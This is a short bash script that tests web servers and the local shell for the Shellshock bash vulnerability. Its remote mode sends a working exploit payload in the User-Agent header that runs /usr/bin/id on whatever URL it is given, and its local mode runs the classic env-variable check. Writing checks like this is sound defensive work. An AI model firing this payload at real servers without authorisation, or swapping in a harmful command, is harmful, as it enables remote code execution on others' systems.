#!/bin/bash

#.  Description:  Script to test if a web server is vulnerable to Shellshock vulnerability
#.  Author: Aur√©lien DUBUS
#.  Version : 1.0

usage() {

  script_name=$(basename $0)
  echo -e "This is the list of available options: "
  echo -e "\t  -r : Remote mode."
  echo -e "\t  -l : Local mode."
  echo "Example: ./$script_name -r http://target.com"
}



while getopts "r:l" opt; do
  case $opt in
    r) url="${OPTARG}"
       domain_name=$(echo "${url}" | cut -d '/' -f3)
       test=$(nslookup ${domain_name})
       test2=$(echo $?)
       if [ ${test2} = "1" ]
          then
            echo "${domain_name} doesn't exist"
      else
        curl -H "User-Agent: () { :; }; /usr/bin/id" ${url}
      fi
      ;;
    l) env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
      ;;
  esac
done

if [ -z $1 ]
then
  usage
fi

exit 0
